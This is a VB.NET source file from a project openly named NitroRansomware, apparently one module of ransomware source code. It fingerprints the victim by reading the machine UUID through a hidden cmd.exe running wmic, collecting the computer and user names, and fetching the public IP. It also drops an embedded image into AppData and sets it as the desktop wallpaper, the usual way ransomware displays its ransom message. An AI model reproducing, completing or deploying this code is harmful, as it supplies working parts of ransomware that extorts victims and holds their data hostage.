Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Threading
Imports System.Net.Http
Imports System.Runtime.InteropServices

Namespace NitroRansomware
	Friend Class User
		Private Shared logging As New Logs("DEBUG", 0)
		Public Shared Function GetIdentifier() As String
			Dim uuid As String = String.Empty
			Try
				Using cmdService As New Cmd("cmd.exe")
					Dim output As String = cmdService.ExecuteCommand("wmic csproduct get uuid")
					uuid = output.Split(ControlChars.Lf)(6)
				End Using
			Catch ex As Exception
				logging.Error(ex.Message)
			End Try
			Return uuid
		End Function

		Public Shared Function GetDetails() As List(Of String)
			Dim output As New List(Of String)()
			Dim pcName As String = Environment.GetEnvironmentVariable("COMPUTERNAME")
			Dim pcUser As String = Environment.GetEnvironmentVariable("UserName")

			output.Add(pcName)
			output.Add(pcUser)
			Return output
		End Function

		Public Shared Function GetIP() As String
			Dim ip As String = String.Empty
			Try
				Using client As New HttpClient()
					Dim response = client.GetAsync("https://api.ipify.org")
					Dim final = response.Result.Content.ReadAsStringAsync()
					ip = final.Result
				End Using
			Catch ex As Exception
				logging.Error(ex.Message)
			End Try
			Return ip
		End Function

		Private Class Cmd
			Implements IDisposable

			Private cmdProcess As Process
			Private sw As StreamWriter
			Private outputWaitHandle As AutoResetEvent
			Private cmdOutput As String
			Public Sub New(ByVal cmdPath As String)
				cmdProcess = New Process()
				outputWaitHandle = New AutoResetEvent(False)
				cmdOutput = String.Empty

				Dim processStartInfo As New ProcessStartInfo()
				processStartInfo.FileName = cmdPath
				processStartInfo.UseShellExecute = False
				processStartInfo.RedirectStandardOutput = True
				processStartInfo.RedirectStandardInput = True
				processStartInfo.CreateNoWindow = True

				AddHandler cmdProcess.OutputDataReceived, AddressOf CmdProcess_OutputDataReceived
				cmdProcess.StartInfo = processStartInfo
				cmdProcess.Start()

				sw = cmdProcess.StandardInput
				cmdProcess.BeginOutputReadLine()

			End Sub
			Public Sub Dispose() Implements IDisposable.Dispose
				cmdProcess.Close()
				cmdProcess.Dispose()
				sw.Close()
				sw.Dispose()
			End Sub
			Public Function ExecuteCommand(ByVal command As String) As String
				cmdOutput = String.Empty

				sw.WriteLine(command)
				sw.WriteLine("echo end")
				outputWaitHandle.WaitOne()
				Return cmdOutput
			End Function
			Private Sub CmdProcess_OutputDataReceived(ByVal sender As Object, ByVal e As DataReceivedEventArgs)
				If e.Data Is Nothing OrElse e.Data = "end" Then
					outputWaitHandle.Set()
				Else
					cmdOutput &= e.Data & Environment.NewLine
				End If
			End Sub

		End Class
	End Class

	Friend Class Wallpaper
		<DllImport("user32.dll", CharSet := CharSet.Auto)> _
		Public Shared Function SystemParametersInfo(ByVal uAction As UInt32, ByVal uParam As Int32, ByVal lpvParam As String, ByVal fuWinIni As UInt32) As Integer
		End Function
		Private Shared SPI_SETWALL As UInt32 = &H14
		Private Shared SPIF_UPDATE As UInt32 = &H1
		Private Shared SPIF_SWEDWINI As UInt32 = &H2

		Private Shared fileName As String

		Public Shared Sub ChangeWallpaper()
			Dim roaming As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
			fileName = roaming & "\wallpaper.png"
			My.Resources.wl.Save(fileName)
			SystemParametersInfo(SPI_SETWALL, 0, fileName, SPIF_UPDATE Or SPIF_SWEDWINI)
		End Sub
	End Class
End Namespace
